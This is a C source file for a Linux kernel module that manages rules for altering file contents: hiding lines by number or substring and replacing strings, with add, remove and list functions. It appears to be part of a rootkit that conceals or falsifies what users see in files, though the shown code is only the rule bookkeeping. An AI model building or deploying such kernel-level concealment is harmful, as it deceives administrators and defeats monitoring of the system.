#include <linux/errno.h>
#include <linux/slab.h>
#include <linux/string.h>

#include "alterate.h"

int add_modified_file(const char *path,
                      int hide_line,
                      const char *hide_substr,
                      const char *src,
                      const char *dst) {
    struct modified_file *m;

    m = kmalloc(sizeof(*m), GFP_KERNEL);
    if (!m)
        return -ENOMEM;

    m->file_path = kstrdup(path, GFP_KERNEL);
    m->hide_line_with_number = hide_line;
    m->hide_line_with_substring =
        hide_substr ? kstrdup(hide_substr, GFP_KERNEL) : NULL;
    m->replace_src = src ? kstrdup(src, GFP_KERNEL) : NULL;
    m->replace_dst = dst ? kstrdup(dst, GFP_KERNEL) : NULL;
    INIT_LIST_HEAD(&m->list);

    spin_lock(&modified_files_lock);
    list_add_tail(&m->list, &modified_files_list);
    spin_unlock(&modified_files_lock);

    pr_info("modified: added rule for %s\n", path);
    return 0;
}

int remove_modified_file(const char *path) {
    struct modified_file *m, *tmp;
    int found = 0;

    spin_lock(&modified_files_lock);
    list_for_each_entry_safe(m, tmp, &modified_files_list, list) {
        if (strcmp(m->file_path, path) == 0) {
            list_del(&m->list);
            kfree(m->file_path);
            kfree(m->hide_line_with_substring);
            kfree(m->replace_src);
            kfree(m->replace_dst);
            kfree(m);
            found = 1;
            break;
        }
    }
    spin_unlock(&modified_files_lock);
    return found ? 0 : -ENOENT;
}

int list_modified_files(char *buf, size_t size) {
    struct modified_file *m;
    size_t len = 0;

    spin_lock(&modified_files_lock);
    list_for_each_entry(m, &modified_files_list, list) {
        len += scnprintf(buf + len, size - len,
                         "%s hide_line=%d hide_substr=%s replace=%s->%s\n",
                         m->file_path,
                         m->hide_line_with_number,
                         m->hide_line_with_substring ?: "none",
                         m->replace_src ?: "none",
                         m->replace_dst ?: "none");
        if (len >= size - 1)
            break;
    }
    spin_unlock(&modified_files_lock);
    return len;
}
